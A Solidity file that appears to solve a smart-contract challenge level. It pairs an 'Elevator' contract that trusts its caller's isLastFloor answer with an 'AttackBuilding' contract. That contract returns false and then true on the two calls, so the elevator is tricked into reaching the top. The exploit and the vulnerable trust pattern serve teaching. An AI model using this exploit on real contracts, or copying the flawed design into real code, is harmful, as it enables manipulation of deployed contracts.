// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract AttackBuilding {
    bool public flag;
    Elevator elevator;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function attack(uint256 _floor) external {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint256) public returns (bool) {
        if (!flag) {
            flag = true;
            return false;
        } else {
            flag = false;
            return true;
        }
    }
}
